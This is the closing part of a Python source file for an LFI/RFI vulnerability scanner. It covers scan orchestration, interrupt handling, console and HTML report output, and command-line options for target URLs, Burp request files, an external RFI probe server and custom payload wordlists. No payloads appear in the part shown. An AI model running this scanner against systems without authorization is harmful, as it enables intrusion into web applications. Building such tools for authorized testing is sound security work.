                    print(Fore.YELLOW + "  [DEBUG] " + f.name + " raw content:" + Style.RESET_ALL)
                    with open(str(f), "r", errors="replace") as _df:
                        _raw = _df.read().replace("\r\n", "\n").replace("\r", "\n")
                    for _ln in _raw.split("\n")[:15]:
                        print(Fore.YELLOW + "    | " + Style.RESET_ALL + repr(_ln))
                    print()
                
                parsed = parse_burp_request(str(f), fallback_host=getattr(self.args, "host", "") or "")
                if parsed:
                    parsed_list = parsed if isinstance(parsed, list) else [parsed]
                    for p in parsed_list:
                        targets.append(p)
                        m = p.get("method", "?")
                        u = p.get("url", "?")
                        info("  Loaded: " + f.name + " -> [" + m + "] " + u)
            except Exception as e:
                warn("  Could not parse " + f.name + ": " + str(e))
        return targets

    def run(self):
        import signal as _signal
        
        targets = self.collect_targets()
        if not targets:
            err("No targets found. Check your inputs.")
            sys.exit(1)
        info("Total targets loaded: " + str(len(targets)))
        info("Press Ctrl+C at any time to stop and save partial report.")
        print()
        
        def _handle_interrupt(sig, frame):
            self._stop_event.set()
            sys.stderr.write(chr(13) + " " * 80 + chr(13))
            sys.stderr.flush()
            print()
            warn("Ctrl+C — stopping threads...")
            self._save_partial_report()
            import os as _os
            _os._exit(0)
        
        _signal.signal(_signal.SIGINT, _handle_interrupt)
        
        try:
            for t in targets:
                if self._stop_event.is_set():
                    break
                self.scan_target(t)
                print()
        except KeyboardInterrupt:
            self._stop_event.set()
            sys.stderr.write(chr(13) + " " * 80 + chr(13))
            sys.stderr.flush()
            print()
            warn("Ctrl+C — stopping threads...")
            self._save_partial_report()
            import os as _os
            _os._exit(0)
        
        self.print_report()

    def _save_partial_report(self):
        import datetime as _dt
        high = [f for f in self.findings if f["severity"] == "HIGH"]
        low = [f for f in self.findings if f["severity"] == "LOW"]
        
        print()
        warn("─" * 60)
        warn("PARTIAL SCAN REPORT (interrupted)")
        warn("─" * 60)
        warn("Probes fired  : " + str(self.scanned))
        warn("HIGH findings : " + str(len(high)))
        warn("LOW / Info    : " + str(len(low)))
        
        if not self.findings:
            warn("No findings collected before interrupt.")
        else:
            for i, f in enumerate(high, 1):
                print("  " + Fore.RED + str(i) + ". [" + f["type"] + "] " +
                      f["url"] + Style.RESET_ALL)
                print("     Param  : " + f["param"])
                print("     Payload: " + f["payload"][:80])
        
        now_str = _dt.datetime.now().strftime("%Y-%m-%d  %H:%M:%S")
        ts = _dt.datetime.now().strftime("%Y%m%d_%H%M%S")
        html_path = getattr(self.args, "html_report", None) or ("lfi_rfi_report_PARTIAL_" + ts + ".html")
        _generate_html_report(self.findings, html_path, now_str + " (PARTIAL — interrupted)", self.scanned)
        ok("HTML report saved  -> " + html_path)
        
        if self.args.output:
            import json as _json
            with open(self.args.output, "w") as fh:
                _json.dump(self.findings, fh, indent=2)
            ok("JSON report saved  -> " + self.args.output)
        
        warn("─" * 60)

    def print_report(self):
        import datetime
        W = 72
        BC = Fore.CYAN
        RD = Fore.RED
        YL = Fore.YELLOW
        
        high = [f for f in self.findings if f["severity"] == "HIGH"]
        low = [f for f in self.findings if f["severity"] == "LOW"]
        now = datetime.datetime.now()
        now_str = now.strftime("%Y-%m-%d  %H:%M:%S")
        
        def hline(c, ch="="):
            print(c + "+" + ch * W + "+" + Style.RESET_ALL)
        
        def row(label, value, vc="", color=BC):
            lbl = " " + label.ljust(15)
            val = str(value)
            sp = max(0, W - len(lbl) - len(val) - 1)
            print(color + "|" + Style.RESET_ALL + lbl + " " + vc + val +
                  Style.RESET_ALL + " " * sp + color + "|" + Style.RESET_ALL)
        
        print()
        hline(BC)
        title_str = "LFI / RFI  VULNERABILITY  SCAN  REPORT"
        tp = (W - len(title_str)) // 2
        print(BC + "|" + " " * tp + Style.BRIGHT + title_str + Style.RESET_ALL +
              " " * (W - tp - len(title_str)) + BC + "|" + Style.RESET_ALL)
        row("Scan Time", now_str, color=BC)
        row("Findings", str(len(high)) + " HIGH  |  " + str(len(low)) + " LOW", color=BC)
        row("Total Probes", str(self.scanned), color=BC)
        hline(BC)
        
        if not self.findings:
            print("  " + Fore.GREEN + "[OK] No vulnerabilities found." + Style.RESET_ALL)
        else:
            if high:
                print()
                print(RD + "+" + "-" * W + "+" + Style.RESET_ALL)
                print(RD + "|" + " " * 20 + Style.BRIGHT + "HIGH SEVERITY FINDINGS" +
                      Style.RESET_ALL + " " * 20 + RD + "|" + Style.RESET_ALL)
                print(RD + "+" + "-" * W + "+" + Style.RESET_ALL)
                for i, f in enumerate(high, 1):
                    print(f"  {RD}[{i}]{Style.RESET_ALL} {f['type']} | {f['param']}")
                    print(f"     URL: {f['url']}")
                    print(f"     Payload: {f['payload'][:80]}")
                    print(f"     Signature: {f['signature']}")
                    print()
            if low:
                print()
                print(YL + "+" + "-" * W + "+" + Style.RESET_ALL)
                print(YL + "|" + " " * 22 + Style.BRIGHT + "LOW / INFO FINDINGS" +
                      Style.RESET_ALL + " " * 22 + YL + "|" + Style.RESET_ALL)
                print(YL + "+" + "-" * W + "+" + Style.RESET_ALL)
                for i, f in enumerate(low, 1):
                    print(f"  {YL}[{i}]{Style.RESET_ALL} {f['type']} | {f['param']}")
                    print(f"     URL: {f['url']}")
                    print(f"     Signature: {f['signature']}")
                    print()
        
        print()
        hline(BC)
        row("SUMMARY", "", color=BC)
        hline(BC, "-")
        row("Total Probes", str(self.scanned), color=BC)
        row("HIGH Confirmed", str(len(high)), Fore.RED + Style.BRIGHT, BC)
        row("LOW / Info", str(len(low)), Fore.YELLOW, BC)
        hline(BC)
        
        if self.args.output:
            with open(self.args.output, "w") as fh:
                json.dump(self.findings, fh, indent=2)
            ok("JSON report saved -> " + self.args.output)
        
        html_path = getattr(self.args, "html_report", None)
        if not html_path:
            ts = now.strftime("%Y%m%d_%H%M%S")
            html_path = "lfi_rfi_report_" + ts + ".html"
        _generate_html_report(self.findings, html_path, now_str, self.scanned)
        ok("HTML report saved -> " + html_path)

# ─── HTML REPORT GENERATOR ───────────────────────────────────────────────────

def _generate_html_report(findings, path, scan_time, total_probes):
    import html as _h
    from collections import defaultdict
    
    high = [f for f in findings if f["severity"] == "HIGH"]
    low = [f for f in findings if f["severity"] == "LOW"]
    
    def e(s):
        return _h.escape(str(s or ""))
    
    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>LFI/RFI Scan Report</title>
<style>
  body {{ font-family: Arial, sans-serif; margin: 20px; background: #0d1117; color: #c9d1d9; }}
  .header {{ background: #161b22; padding: 20px; border-bottom: 3px solid #f85149; }}
  .header h1 {{ color: #f85149; margin: 0; }}
  .summary {{ display: flex; gap: 20px; margin: 20px 0; flex-wrap: wrap; }}
  .stat {{ background: #161b22; padding: 15px 25px; border-radius: 8px; border: 1px solid #30363d; }}
  .stat .num {{ font-size: 28px; font-weight: bold; }}
  .stat .lbl {{ font-size: 12px; color: #8b949e; }}
  .stat.high .num {{ color: #f85149; }}
  .stat.low .num {{ color: #e3b341; }}
  .stat.info .num {{ color: #58a6ff; }}
  .finding {{ background: #161b22; margin: 15px 0; padding: 15px; border-radius: 8px; border: 1px solid #30363d; }}
  .finding.high {{ border-left: 4px solid #f85149; }}
  .finding.low {{ border-left: 4px solid #e3b341; }}
  .finding .title {{ font-weight: bold; font-size: 16px; }}
  .finding .url {{ color: #58a6ff; word-break: break-all; }}
  .finding .payload {{ background: #0d1117; padding: 8px; border-radius: 4px; font-family: monospace; color: #e3b341; word-break: break-all; }}
  .finding .sig {{ color: #3fb950; font-family: monospace; }}
  .finding .output {{ background: #0d1117; padding: 10px; border-radius: 4px; font-family: monospace; font-size: 12px; white-space: pre-wrap; word-break: break-all; max-height: 300px; overflow-y: auto; }}
  .footer {{ margin-top: 40px; padding-top: 20px; border-top: 1px solid #30363d; text-align: center; color: #8b949e; font-size: 12px; }}
</style>
</head>
<body>
<div class="header">
  <h1>🔒 LFI / RFI Vulnerability Scan Report</h1>
  <div style="color:#8b949e;">Scan Time: {e(scan_time)}</div>
</div>
<div class="summary">
  <div class="stat high"><div class="num">{len(high)}</div><div class="lbl">HIGH</div></div>
  <div class="stat low"><div class="num">{len(low)}</div><div class="lbl">LOW / INFO</div></div>
  <div class="stat info"><div class="num">{total_probes}</div><div class="lbl">Total Probes</div></div>
</div>
"""
    
    if not findings:
        html += '<p style="color:#3fb950;font-size:20px;">✅ No vulnerabilities found.</p>'
    else:
        for f in high:
            html += f"""
<div class="finding high">
  <div class="title">🔴 HIGH - {e(f['type'])}</div>
  <div><strong>Parameter:</strong> {e(f['param'])}</div>
  <div><strong>URL:</strong> <span class="url">{e(f['url'])}</span></div>
  <div><strong>Payload:</strong> <span class="payload">{e(f['payload'])}</span></div>
  <div><strong>Signature:</strong> <span class="sig">{e(f['signature'])}</span></div>
  <div><strong>Status:</strong> {e(f.get('status', '?'))}</div>
  <div><strong>Output Type:</strong> {e(f.get('encoding_label', 'Plain Text'))}</div>
  <div><strong>Response Snippet:</strong></div>
  <div class="output">{e(f.get('raw_output', '')[:1000])}</div>
</div>"""
        
        for f in low:
            html += f"""
<div class="finding low">
  <div class="title">🟡 LOW - {e(f['type'])}</div>
  <div><strong>Parameter:</strong> {e(f['param'])}</div>
  <div><strong>URL:</strong> <span class="url">{e(f['url'])}</span></div>
  <div><strong>Signature:</strong> <span class="sig">{e(f['signature'])}</span></div>
  <div><strong>Status:</strong> {e(f.get('status', '?'))}</div>
</div>"""
    
    html += """
<div class="footer">Generated by LFI/RFI Scanner - Authorized use only</div>
</body>
</html>"""
    
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(html)

# ─── CLI ─────────────────────────────────────────────────────────────────────

def banner():
    print(Fore.RED + Style.BRIGHT + """
  ██╗     ███████╗██╗    ██████╗ ███████╗██╗    ███████╗ ██████╗ █████╗ ███╗   ██╗
  ██║     ██╔════╝██║    ██╔══██╗██╔════╝██║    ██╔════╝██╔════╝██╔══██╗████╗  ██║
  ██║     █████╗  ██║    ██████╔╝█████╗  ██║    ███████╗██║     ███████║██╔██╗ ██║
  ██║     ██╔══╝  ██║    ██╔══██╗██╔══╝  ██║    ╚════██║██║     ██╔══██║██║╚██╗██║
  ███████╗██║     ██║    ██║  ██║██║     ██║    ███████║╚██████╗██║  ██║██║ ╚████║
  ╚══════╝╚═╝     ╚═╝    ╚═╝  ╚═╝╚═╝     ╚═╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
""" + Style.RESET_ALL)
    print("  " + Fore.YELLOW + "LFI / RFI Vulnerability Scanner" + Style.RESET_ALL)
    print("  " + Fore.RED + "FOR AUTHORIZED PENETRATION TESTING ONLY" + Style.RESET_ALL)
    print()

def main():
    banner()
    
    ap = argparse.ArgumentParser(
        description="LFI/RFI Scanner - authorized use only",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python lfi_rfi_scanner.py -u 'http://target.com/page.php?file=home'\n"
            "  python lfi_rfi_scanner.py --burp-dir ./requests/ --thread 10\n"
            "  python lfi_rfi_scanner.py --burp-dir ./burp/ --host 127.0.0.1:42001\n"
            "  python lfi_rfi_scanner.py --burp-dir ./burp/ --debug-burp"
        )
    )
    
    tg = ap.add_argument_group("Targets")
    tg.add_argument("-u", "--url", help="Single target URL")
    tg.add_argument("-X", "--method", default="GET", help="HTTP method (default: GET)")
    tg.add_argument("-d", "--data", help="POST body data")
    tg.add_argument("--cookies", help="Cookies: \"name=val; name2=val2\"")
    tg.add_argument("--urls-file", metavar="FILE", help="File with one URL per line")
    tg.add_argument("--burp-dir", metavar="DIR", help="Folder of Burp request files (raw or XML)")
    tg.add_argument("--host", metavar="HOST", help="Target host:port (e.g., 127.0.0.1:42001)")
    tg.add_argument("--debug-burp", action="store_true", help="Print debug info for Burp parsing")
    
    rf = ap.add_argument_group("RFI server")
    rf.add_argument("--rfi-server", metavar="URL", help="RFI probe server URL")
    rf.add_argument("--rfi-token", metavar="TOKEN", default="RFIPROBE_OK", help="RFI probe token")
    rf.add_argument("--rfi-webhook-id", metavar="UUID", help="webhook.site UUID")
    
    pl = ap.add_argument_group("Custom payload files")
    pl.add_argument("--lfi-payloads-file", metavar="FILE", help="Custom LFI wordlist")
    pl.add_argument("--rfi-payloads-file", metavar="FILE", help="Custom RFI wordlist")
    pl.add_argument("--no-expand", action="store_true", help="Skip payload expansion")
    
    sc = ap.add_argument_group("Scan options")
    sc.add_argument("--path-scan", action="store_true", help="Scan URL path segments")
    sc.add_argument("--lfi-only", action="store_true", help="LFI only")
    sc.add_argument("--rfi-only", action="store_true", help="RFI only")
    sc.add_argument("--threads", type=int, default=5, help="Concurrent threads (default: 5)")
    sc.add_argument("--timeout", type=int, default=10, help="Request timeout (default: 10)")
    sc.add_argument("--delay", type=float, default=0, help="Delay between requests")
    
    ou = ap.add_argument_group("Output")
    ou.add_argument("-o", "--output", help="Save JSON report")
    ou.add_argument("--html-report", metavar="FILE", help="Save HTML report")
    ou.add_argument("--proxy", help="HTTP proxy")
    
    args = ap.parse_args()
    
    if not any([args.url, args.urls_file, args.burp_dir]):
        ap.print_help()
        sys.exit(1)
    
    if args.rfi_only and not args.rfi_server:
        err("--rfi-only requires --rfi-server.")
        sys.exit(1)
    
    Scanner(args).run()

if __name__ == "__main__":
    main()
